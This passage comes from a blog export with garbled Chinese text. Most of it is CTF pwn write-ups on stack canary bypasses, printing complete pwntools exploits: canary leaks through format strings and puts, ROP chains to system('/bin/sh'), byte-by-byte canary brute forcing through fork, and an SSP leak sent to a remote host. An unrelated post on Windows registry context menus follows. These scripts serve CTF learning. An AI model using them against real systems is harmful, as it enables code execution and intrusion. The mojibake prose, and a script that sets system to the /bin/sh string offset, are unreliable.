0x45216else: p = remote(&apos;127.0.0.1&apos;, 1337) libc = ELF(&apos;./libc.so.6&apos;) libc_base_offset = 0xeb870 one_gadget_offset = 0x464d8elf = ELF(&apos;./microwave&apos;)log.success(&apos;libc_base_offset = &apos; + hex(libc_base_offset))log.success(&apos;one_gadget_offset = &apos; + hex(one_gadget_offset))def connect(username, password): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;1&apos;) p.sendlineafter(&apos;username:&apos;, username) p.sendlineafter(&apos;password:&apos;, password)def edit(content): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;2&apos;) p.sendlineafter(&apos;#&gt;&apos;, content)def tweet(): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;3&apos;)def quit(): p.sendlineafter(&apos;[MicroWave]:&apos;, &apos;q&apos;)# gdb.attach(p)password = &apos;n07_7h3_fl46&apos;connect(&apos;%p.&apos; * 8, password)p.recvuntil(&apos;Checking&apos;)leak_data = p.recvline().strip().split(&apos;.&apos;)[:-1]print leak_datacanary = int(leak_data[5][2:], 16)log.success(&apos;canary = &apos; + hex(canary))leak_libc = int(leak_data[1][2:], 16)log.success(&apos;leak_libc = &apos; + hex(leak_libc))libc_base = leak_libc - libc_base_offsetlog.success(&apos;libc_base = &apos; + hex(libc_base))one_gadget = libc_base + one_gadget_offsetlog.success(&apos;one_gadget = &apos; + hex(one_gadget))payload = flat([ &apos;A&apos; * 1032, canary, &apos;B&apos; * 8, one_gadget])edit(payload)p.interactive() 2017-CSAW-Quals-scvå¼€äº†Canaryï¼š 123456[*] &apos;/home/assassinq/pwn/ctf-wiki/canary/2017-CSAW-Quals-csv/scv&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) å°±åªæœ‰ä¸€ä¸ªmainå‡½æ•°ï¼Œç”±äºæ˜¯c++ç¨‹åºï¼Œçœ‹èµ·æ¥æœ‰ç‚¹æ··ä¹±ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; __int64 v3; // rax __int64 v4; // rax __int64 v5; // rax __int64 v6; // rax __int64 v7; // rax __int64 v8; // rax __int64 v9; // rax __int64 v10; // rax __int64 v11; // rax __int64 v12; // rax __int64 v13; // rax __int64 v14; // rax __int64 v15; // rax __int64 v16; // rax __int64 v17; // rax __int64 v18; // rax __int64 v19; // rax __int64 v20; // rax __int64 v21; // rax int choice; // [rsp+4h] [rbp-BCh] int v24; // [rsp+8h] [rbp-B8h] int v25; // [rsp+Ch] [rbp-B4h] char buf; // [rsp+10h] [rbp-B0h] unsigned __int64 v27; // [rsp+B8h] [rbp-8h] v27 = __readfsqword(0x28u); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); choice = 0; v24 = 1; v25 = 0; while ( v24 ) &#123; v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v3, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]SCV GOOD TO GO,SIR....\"); std::ostream::operator&lt;&lt;(v4, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v5 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v5, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"1.FEED SCV....\"); std::ostream::operator&lt;&lt;(v6, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v7 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"2.REVIEW THE FOOD....\"); std::ostream::operator&lt;&lt;(v7, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v8 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"3.MINE MINERALS....\"); std::ostream::operator&lt;&lt;(v8, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v9 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v9, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"&gt;&gt;\"); std::istream::operator&gt;&gt;(&amp;std::cin, &amp;choice); switch ( choice ) &#123; case 2: // show v15 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v15, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v16 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]REVIEW THE FOOD...........\"); std::ostream::operator&lt;&lt;(v16, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v17 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v17, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v18 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]PLEASE TREAT HIM WELL.....\"); std::ostream::operator&lt;&lt;(v18, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v19 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v19, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); puts(&amp;buf); break; case 3: // exit v24 = 0; v20 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]BYE ~ TIME TO MINE MIENRALS...\"); std::ostream::operator&lt;&lt;(v20, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); break; case 1: // edit v10 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v10, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v11 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]SCV IS ALWAYS HUNGRY.....\"); std::ostream::operator&lt;&lt;(v11, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v12 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v12, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v13 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]GIVE HIM SOME FOOD.......\"); std::ostream::operator&lt;&lt;(v13, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v14 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"-------------------------\"); std::ostream::operator&lt;&lt;(v14, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"&gt;&gt;\"); v25 = read(0, &amp;buf, 0xF8uLL); break; default: v21 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"[*]DO NOT HURT MY SCV....\"); std::ostream::operator&lt;&lt;(v21, &amp;std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); break; &#125; &#125; return 0LL;&#125; åœ¨case 1å­˜åœ¨buffer overflowï¼Œé€šè¿‡è°ƒè¯•è§‚å¯Ÿåˆ°è¾“å…¥ä¸Canaryä¹‹é—´çš„åç§»ä¸º168ã€‚å¦‚æœè¦æ³„æ¼Canaryçš„è¯ï¼Œå°±å¿…é¡»è®©æ‰€æœ‰çš„\\x00è¢«è¦†ç›–æ‰ï¼ŒåŒ…æ‹¬Canaryä½ä½çš„\\x00ï¼Œä»¥è®©putsè®¤ä¸ºbufè¿åŒCanaryä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚libcä¹Ÿå¯ä»¥ç”¨åŒæ ·çš„æ–¹å¼æ³„æ¼ï¼Œæœ€åæ”¾ä¸Šexpï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'amd64'local = 1if local: p = process('./scv', env=&#123;'LD_PRELOAD':'./libc-2.23.so'&#125;)else: p = remote('127.0.0.1', 8888)libc = ELF('./libc-2.23.so')elf = ELF('./scv')# gdb.attach(p)system_offset = libc.symbols['system']str_bin_sh_offset = next(libc.search('/bin/sh'))log.success('system_offset = ' + hex(system_offset))log.success('str_bin_sh_offset = ' + hex(str_bin_sh_offset))pop_rdi_ret = 0x0000000000400ea3log.success('pop_rdi_ret = ' + hex(pop_rdi_ret))one_gadget_offset = 0x45216log.success('one_gadget_offset = ' + hex(one_gadget_offset))libc_base_offset = 0x3a20alog.success('libc_base_offset = ' + hex(libc_base_offset))def edit(content): p.sendlineafter('&gt;&gt;', '1') p.recvuntil('&gt;&gt;') p.send(content)def show(): p.sendlineafter('&gt;&gt;', '2')def quit(): p.sendlineafter('&gt;&gt;', '3')edit('A' * (40 - 1) + ':')show()p.recvuntil(':')leak_addr = u64(p.recv(6).ljust(8, '\\x00'))log.success('leak_addr = ' + hex(leak_addr))libc_base = leak_addr - libc_base_offsetlog.success('libc_base = ' + hex(libc_base))system = libc_base + str_bin_sh_offsetstr_bin_sh = libc_base + str_bin_sh_offsetlog.success('system = ' + hex(system))log.success('str_bin_sh = ' + hex(str_bin_sh))edit('A' * 168 + ':')show()p.recvuntil(':')canary = u64('\\x00' + p.recv(7))log.success('canary = ' + hex(canary))payload = flat([ 'A' * 168, canary, 'B' * 8, pop_rdi_ret, str_bin_sh, system])edit(payload)quit()p.interactive() çˆ†ç ´CanaryCanaryä¹‹æ‰€ä»¥è¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œæ˜¯å› ä¸ºå¯¹å…¶è¿›è¡Œçˆ†ç ´æˆåŠŸç‡å¤ªä½ã€‚ä»¥32ä½ç¨‹åºä¸ºä¾‹ï¼Œé™¤å»æœ€åä¸€ä¸ª\\x00ï¼Œå…¶å¯èƒ½å€¼å°†ä¼šæ˜¯0x100^3=16777216ï¼ˆå®é™…ä¸Šç”±äºCanaryçš„ç”Ÿæˆè§„åˆ™ä¼šå°äºè¿™ä¸ªå€¼ï¼‰ï¼Œ64ä½ä¸‹çš„Canaryå€¼æ›´æ˜¯è¿œå¤§äºè¿™ä¸ªæ•°é‡çº§ã€‚æ­¤å¤–ï¼Œä¸€æ—¦Canaryçˆ†ç ´å¤±è´¥ï¼Œç¨‹åºå°±ä¼šç«‹å³ç»“æŸï¼ŒCanaryå€¼ä¹Ÿä¼šå†æ¬¡æ›´æ–°ï¼Œä½¿å¾—çˆ†ç ´æ›´åŠ å›°éš¾ã€‚ä½†æ˜¯åŒä¸€ä¸ªè¿›ç¨‹å†…æ‰€æœ‰çš„Canaryå€¼éƒ½æ˜¯ä¸€è‡´çš„ï¼Œå½“ç¨‹åºæœ‰å¤šä¸ªè¿›ç¨‹ï¼Œä¸”å­è¿›ç¨‹å†…å‡ºç°äº†æ ˆæº¢å‡ºæ—¶ï¼Œç”±äºå­è¿›ç¨‹å´©æºƒä¸ä¼šå½±å“åˆ°ä¸»è¿›ç¨‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œçˆ†ç ´ã€‚ç”šè‡³æˆ‘ä»¬å¯ä»¥é€šè¿‡é€ä½çˆ†ç ´æ¥å‡å°‘çˆ†ç ´æ—¶é—´ã€‚ 2017-NSCTF-pwn2123456[*] '/home/assassinq/pwn/ctf-wiki/canary/2017-NSCTF-pwn2/pwn2' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) å¼€å¯äº†Canaryã€‚mainå‡½æ•°ä¸­çœ‹åˆ°åªè¦æ¯æ¬¡å›ç­”Yï¼Œå¯ä»¥æ— é™æ¬¡åœ°forkå‡ºæ–°çš„è¿›ç¨‹ï¼š 123456789101112131415161718192021222324252627282930313233343536int __cdecl main()&#123; char v1; // [esp+1Bh] [ebp-5h] __pid_t pid; // [esp+1Ch] [ebp-4h] setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); while ( 1 ) &#123; write(1, \"[*] Do you love me?[Y]\\n\", 0x17u); if ( getchar() != 'Y' ) break; v1 = getchar(); while ( v1 != '\\n' &amp;&amp; v1 ) ; pid = fork(); if ( pid ) &#123; if ( pid &lt;= 0 ) &#123; if ( pid &lt; 0 ) exit(0); &#125; else // son &#123; wait(0); &#125; &#125; else // father &#123; func(); &#125; &#125; return 0;&#125; func()å‡½æ•°ä¸­å­˜åœ¨buffer overflowï¼Œè€Œä¸”è¿˜å­˜åœ¨format stringï¼Œé‚£è¿™é‡Œå…¶å®æ˜¯å¯ä»¥ç”¨è¿™ä¸ªæ¼æ´æ³„æ¼å‡ºCanaryçš„ï¼š 12345678910111213141516171819202122unsigned int func()&#123; char *s; // ST18_4 int buf; // [esp+1Ch] [ebp-1Ch] int v3; // [esp+20h] [ebp-18h] int v4; // [esp+24h] [ebp-14h] int v5; // [esp+28h] [ebp-10h] unsigned int v6; // [esp+2Ch] [ebp-Ch] v6 = __readgsdword(0x14u); buf = 0; v3 = 0; v4 = 0; v5 = 0; s = (char *)malloc(0x40u); input_name(&amp;buf); sprintf(s, \"[*] Welcome to the game %s\", &amp;buf); printf(s); puts(\"[*] Input Your Id:\"); read(0, &amp;buf, 0x100u); return __readgsdword(0x14u) ^ v6;&#125; Canaryé‡‡ç”¨çˆ†ç ´çš„æ–¹æ³•ï¼Œlibcåˆ™å¯ä»¥ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„æ¼ã€‚æ”¾ä¸Šé€å­—èŠ‚çˆ†ç ´expï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.arch = 'i386'p = process('./pwn2', env=&#123;'LD_RELOAD':'./libc.so.6_x86'&#125;)elf = ELF('./pwn2')libc = ELF('./libc.so.6_x86')system_offset = libc.symbols['system']str_bin_sh_offset = next(libc.search('/bin/sh'))log.success('system_offset = ' + hex(system_offset))log.success('str_bin_sh_offset = ' + hex(str_bin_sh_offset))libc_offset = 0x1b2000log.success('libc_offset = ' + hex(libc_offset))one_gadget_offset = 0x3af1clog.success('one_gadget_offset = ' + hex(one_gadget_offset))# gdb.attach(p)def forkNew(): p.sendlineafter('[Y]', 'Y')def inputName(name): p.recvuntil('[*] Input Your name please:') p.send(name)def inputId(Id): p.recvuntil('[*] Input Your Id:') p.send(Id)canary = '\\x00'for i in range(3): for j in range(256): # log.info('try ' + hex(j)) if i != 0 and j == 0: p.sendline('Y') else: forkNew() inputName('%12$p\\n') p.recvuntil('[*] Welcome to the game ') leak_addr = int(p.recv(10), 16) payload = 'A' * 16 payload += canary payload += chr(j) inputId(payload) p.recv() if 'smashing' not in p.recv(): canary += chr(j) log.info('At round %d find canary byte %#x' %(i, j)) breaklog.success('canary = ' + hex(u32(canary)))log.success('leak_addr = ' + hex(leak_addr))libc_base = leak_addr - libc_offsetlog.success('libc_base = ' + hex(libc_base))system = libc_base + system_offsetstr_bin_sh = libc_base + str_bin_sh_offsetone_gadget = libc_base + one_gadget_offsetlog.success('system = ' + hex(system))log.success('str_bin_sh = ' + hex(str_bin_sh))log.success('one_gadget = ' + hex(one_gadget))p.sendline('Y')inputName('AssassinQ\\n')payload = flat([ 'A' * 16, canary, 'B' * 12, one_gadget])inputId(payload)p.interactive() SSPï¼ˆStack Smashing Protectï¼‰ Leaké™¤äº†é€šè¿‡å„ç§æ–¹æ³•æ³„éœ²Canaryä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨__stack_chk_failå‡½æ•°æ³„éœ²ä¿¡æ¯ã€‚è¿™ç§æ–¹æ³•ä½œç”¨ä¸å¤§ï¼Œæ²¡åŠæ³•è®©æˆ‘ä»¬get shellã€‚ä½†æ˜¯å½“æˆ‘ä»¬éœ€è¦æ³„éœ²çš„flagæˆ–è€…å…¶ä»–ä¸œè¥¿å­˜åœ¨äºå†…å­˜ä¸­æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½å¯ä»¥ä½¿ç”¨ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´æ¥æŠŠå®ƒä»¬æ³„éœ²å‡ºæ¥ã€‚è¿™ä¸ªæ–¹æ³•å«åšSSPï¼ˆStack Smashing Protectï¼‰ Leakã€‚ 1234567891011void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (\"stack smashing detected\");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\");&#125; JarvisOJ-Smashes1234567[*] '/home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled å¼€äº†Canaryï¼Œå­˜åœ¨æº¢å‡ºä½†æ˜¯æ²¡æ³•æ³„æ¼ï¼š 123456789101112131415161718192021222324252627282930unsigned __int64 sub_4007E0()&#123; __int64 i; // rbx int c; // eax __int64 v3; // [rsp+0h] [rbp-128h] unsigned __int64 v4; // [rsp+108h] [rbp-20h] v4 = __readfsqword(0x28u); __printf_chk(1LL, \"Hello!\\nWhat's your name? \"); if ( !_IO_gets((__int64)&amp;v3) )LABEL_9: _exit(1); i = 0LL; __printf_chk(1LL, \"Nice to meet you, %s.\\nPlease overwrite the flag: \"); while ( 1 ) &#123; c = _IO_getc(stdin); if ( c == -1 ) goto LABEL_9; if ( c == '\\n' ) break; flag[i++] = c; if ( i == 32 ) goto LABEL_8; &#125; memset((void *)((signed int)i + 6294816LL), 0, (unsigned int)(32 - i));LABEL_8: puts(\"Thank you, bye!\"); return __readfsqword(0x28u) ^ v4;&#125; è¿™é‡Œæƒ³åˆ°SSP Leakï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿè¾“å…¥è¶³å¤Ÿé•¿çš„å­—ç¬¦ä¸²è¦†ç›–æ‰argv[0]ï¼Œæˆ‘ä»¬å°±èƒ½è®©Canaryä¿æŠ¤è¾“å‡ºæˆ‘ä»¬æƒ³è¦åœ°å€ä¸Šçš„å€¼ï¼š 123.rodata:000000000040094E ; char s[].rodata:000000000040094E s db &apos;Thank you, bye!&apos;,0 ; DATA XREF: sub_4007E0:loc_400878â†‘o.rodata:000000000040095E align 20h å°è¯•è¾“å‡ºå­—ç¬¦ä¸²sï¼š 1234567891011#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'p = remote('pwn.jarvisoj.com', 9877)test = 0x40094Ep.recvuntil('What\\'s your name?')p.sendline(p64(test) * 200)p.recvuntil('Please overwrite the flag:')p.sendline()p.recvall()p.interactive() å¾—åˆ°çš„ç»“æœæœç„¶æ³„æ¼å‡ºæ¥äº†ï¼š 123[DEBUG] Received 0x4c bytes: 'Thank you, bye!\\n' '*** stack smashing detected ***: Thank you, bye! terminated\\n' é‚£ä¹ˆæ¥ä¸‹æ¥éœ€è¦åšçš„å°±æ˜¯æ‰¾åˆ°å­˜æ”¾flagçš„åœ°å€ï¼Œåœ¨idaä¸Šæ‰¾åˆ°æ˜¯0x600d21ï¼Œä½†æ˜¯ç”±äºmainå‡½æ•°ä¸­æœ€åä¸€å¥è¯memset((void *)((signed int)i + 6294816LL), 0, (unsigned int)(32 - i));ï¼Œåœ¨è°ƒç”¨__stack_chk_fail()çš„æ—¶å€™ï¼Œ0x600d21ä¸Šçš„å€¼æ—©å°±å·²ç»è¢«è¦†ç›–æˆå…¶å®ƒå€¼äº†ã€‚é€šè¿‡gdbè°ƒè¯•ï¼Œå‘ç°åœ¨å¦ä¸€ä¸ªåœ°å€ä¹Ÿæœ‰flagï¼š 12345assassinq&gt;&gt; find &apos;CTF&apos;Searching for &apos;CTF&apos; in: None rangesFound 2 results, display max 2 items:smashes : 0x400d21 (&quot;CTF&#123;Here&apos;s the flag on server&#125;&quot;)smashes : 0x600d21 (&quot;CTF&#123;Here&apos;s the flag on server&#125;&quot;) è¿™é‡Œå°±æ¶‰åŠåˆ°äº†elfæ–‡ä»¶çš„é‡æ˜ å°„ï¼Œå½“å¯æ‰§è¡Œæ–‡ä»¶è¶³å¤Ÿå°çš„æ—¶å€™ï¼Œæ–‡ä»¶çš„ä¸åŒåŒºæ®µå¯èƒ½ä¼šè¢«å¤šæ¬¡æ˜ å°„ï¼š 123456789101112131415161718assassinq&gt;&gt; vmmap Start End Perm Name0x00400000 0x00401000 r-xp /home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes0x00600000 0x00601000 rw-p /home/assassinq/pwn/ctf-wiki/canary/JarvisOJ-Smashes/smashes0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fd7000 0x00007ffff7fda000 rw-p mapped0x00007ffff7ff7000 0x00007ffff7ffa000 r--p [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p mapped0x00007ffffffde000 0x00007ffffffff000 rw-p [stack]0xffffffffff600000 0xffffffffff601000 r-xp [vsyscall] é‚£ä¹ˆexpå¦‚ä¸‹ï¼š 123456789101112#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'p = remote('pwn.jarvisoj.com', 9877)test = 0x40094Eflag = 0x400d20p.recvuntil('What\\'s your name?')p.sendline(p64(flag) * 200)p.recvuntil('Please overwrite the flag:')p.sendline()p.recvall()p.interactive() Auxiliary Vectorç›´æ¥â€œæŒ–â€åˆ°canaryäº§ç”Ÿçš„æœ¬æºâ€”â€”AUXV(Auxiliary Vector)ï¼Œå¹¶ä¿®æ”¹è¯¥ç»“æ„ä½“ä»è€Œä½¿canaryå€¼å¯æ§ã€‚ 2017-TCTF-Final-upxofå‚è€ƒç½‘ç«™https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/https://www.anquanke.com/post/id/85203https://bbs.ichunqiu.com/thread-44069-1-1.htmlhttps://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/https://www.jianshu.com/p/c3624f5dd583https://deadc0de.re/articles/microwave-write-up.htmlhttps://braddaniels.org/csaw-quals-2017-scv/https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"https://qianfei11.github.io/tags/pwn/"}]},{"title":"ä¸ºWindowsç³»ç»Ÿé¼ æ ‡å³é”®æ·»åŠ è½¯ä»¶å’Œå›¾æ ‡","slug":"ä¸ºWindowsç³»ç»Ÿé¼ æ ‡å³é”®æ·»åŠ è½¯ä»¶å’Œå›¾æ ‡","date":"2019-02-15T03:00:27.000Z","updated":"2019-02-15T03:32:47.877Z","comments":true,"path":"2019/02/15/ä¸ºWindowsç³»ç»Ÿé¼ æ ‡å³é”®æ·»åŠ è½¯ä»¶å’Œå›¾æ ‡/","link":"","permalink":"https://qianfei11.github.io/2019/02/15/ä¸ºWindowsç³»ç»Ÿé¼ æ ‡å³é”®æ·»åŠ è½¯ä»¶å’Œå›¾æ ‡/","excerpt":"Windowsä¸‹ä¸æƒ³è¦æ€»æ˜¯å…ˆæ‰“å¼€è½¯ä»¶ï¼Œå†æŠŠæ–‡ä»¶æ‹–è¿›å»ã€‚é‚£å°±å¯ä»¥ä¿®æ”¹ä¸€ä¸‹å³é”®èœå•ã€‚","text":"Windowsä¸‹ä¸æƒ³è¦æ€»æ˜¯å…ˆæ‰“å¼€è½¯ä»¶ï¼Œå†æŠŠæ–‡ä»¶æ‹–è¿›å»ã€‚é‚£å°±å¯ä»¥ä¿®æ”¹ä¸€ä¸‹å³é”®èœå•ã€‚ ä¿®æ”¹æ–‡ä»¶å³é”®èœå•æŸ¥å£³è¿˜æœ‰è°ƒè¯•çš„æ—¶å€™æ€»æ˜¯æŠŠæ–‡ä»¶æ‹–æ¥æ‹–å»å®åœ¨å¤ªéº»çƒ¦äº†ï¼Œä¸å¦‚ä¿®æ”¹ä¸€ä¸‹ï¼Œç›´æ¥å³é”®å°±èƒ½å¼€å§‹åˆ†æã€‚ä¸‹é¢å°±è®°å½•ä¸€ä¸‹ä¿®æ”¹æ–‡ä»¶å³é”®èœå•çš„è¿‡ç¨‹ï¼š é¦–å…ˆæ‰“å¼€æ³¨å†Œè¡¨ï¼š ä¾æ¬¡è¿›å…¥è®¡ç®—æœº\\HKEY_CLASSES_ROOT\\*\\shellï¼Œåœ¨shellé¡¹ä¸‹æ–°å»ºä¸€ä¸ªé¡¹ï¼Œè¿™é‡Œä»¥PEIDä¸ºä¾‹ã€‚ç„¶ååœ¨æ–°å»ºå¥½çš„PEIDé¡¹ä¸‹ï¼Œæ–°å»ºå­—ç¬¦ä¸²å€¼ï¼Œå‘½åä¸ºIconï¼Œå¹¶å°†å…¶å€¼ä¿®æ”¹ä¸ºæºæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼ˆ$PATH_TO_EXEï¼‰ï¼š æœ€åå†åœ¨PEIDé¡¹ä¸‹æ–°å»ºé¡¹Commandï¼Œä¿®æ”¹å…¶å€¼ä¸º&quot;$PATH_TO_EXE&quot; &quot;%1&quot;ï¼š æˆåŠŸåçœ‹ä¸€çœ‹æ•ˆæœï¼š ä¿®æ”¹ç©ºç™½å¤„å³é”®èœå•åœ¨å½“å‰ç›®å½•ä¸‹æ‰“å¼€cmdçª—å£å¤ªéº»çƒ¦ï¼Œä¸å¦‚ä¹Ÿæ·»åŠ åˆ°å³é”®èœå•é‡Œï¼š é¦–å…ˆåŒæ ·æ‰“å¼€æ³¨å†Œè¡¨ã€‚è¿›å…¥è®¡ç®—æœº\\HKEY_CLASSES_ROOT\\Directory\\Background\\shellï¼Œæ–°å»ºé¡¹åœ¨æ­¤è¿è¡ŒCMDï¼ŒåŒä»¥ä¸Šä¸€æ ·æ–°å»ºå­—ç¬¦ä¸²å€¼Iconï¼Œå¹¶ä¿®æ”¹å€¼ï¼š åœ¨åœ¨æ­¤è¿è¡ŒCMDä¸‹æ–°å»ºé¡¹Commandï¼Œä¿®æ”¹å€¼ä¸º$PATH_TO_EXEï¼Œè¿™é‡Œä¸éœ€è¦åŒå¼•å·&quot;ï¼Œä¹Ÿä¸éœ€è¦%1ï¼š çœ‹çœ‹æ•ˆæœï¼š å‚è€ƒç½‘ç«™https://blog.csdn.net/p312011150/article/details/81207059","categories":[],"tags":[{"name":"solution","slug":"solution","permalink":"https://qianfei11.github.io/tags/solution/"}]},{"title":"ä¸­çº§ROP-ret2__libc_csu_init-writeup","slug":"ä¸­çº§ROP-ret2-libc-csu-init-writeup","date":"2019-02-12T10:02:50.000Z","updated":"2019-02-14T01:40:26.013Z","comments":true,"path":"2019/02/12/ä¸­çº§ROP-ret2-libc-csu-init-writeup/","link":"","permalink":"https://qianfei11.github.io/2019/02/12/ä¸­çº§ROP-ret2-libc-csu-init-writeup/","excerpt":"ç”¨è’¸ç±³çš„ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux_x64ç¯‡ä¸­çš„level5æ¥ç ”ç©¶ä¸€ä¸‹64ä½çš„ROPã€‚","text":"ç”¨è’¸ç±³çš„ä¸€æ­¥ä¸€æ­¥å­¦ROPä¹‹linux_x64ç¯‡ä¸­çš„level5æ¥ç ”ç©¶ä¸€ä¸‹64ä½çš„ROPã€‚ 64ä½çš„ç¨‹åºä¸­ï¼Œå‡½æ•°æ‰€è°ƒç”¨çš„å‚æ•°å¹¶ä¸æ˜¯å…¨éƒ¨åœ¨æ ˆä¸Šï¼Œå‰å…­ä¸ªå‚æ•°åˆ†åˆ«ä½äºrdiã€rsiã€rdxã€rcxã€r8å’Œr9ï¼Œå…¶ä½™å‚æ•°åˆ™åœ¨æ 